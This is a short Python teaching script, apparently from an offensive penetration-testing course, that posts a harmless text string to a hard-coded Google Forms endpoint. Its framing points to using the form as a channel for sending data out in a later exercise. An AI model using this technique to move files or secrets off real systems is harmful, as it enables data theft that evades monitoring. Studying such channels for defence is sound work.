'''
Caution
--------
Using this script for any malicious purpose is prohibited and against the law. Please read Google terms and conditions carefully. 
Use it on your own risk. 
'''

# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2



import requests

url = 'https://docs.google.com/forms/d/1Ndjnm5YViqIYXyIuoTHsCqW_YfGa-vaaKEahY2cc5cs/formResponse'

form_data = {'entry.1301128713':'Lets see how we can use this, in the next exercise'}

r = requests.post(url, data=form_data)

# Submitting form-encoded data in requests:-
# http://docs.python-requests.org/en/latest/user/quickstart/#more-complicated-post-requests

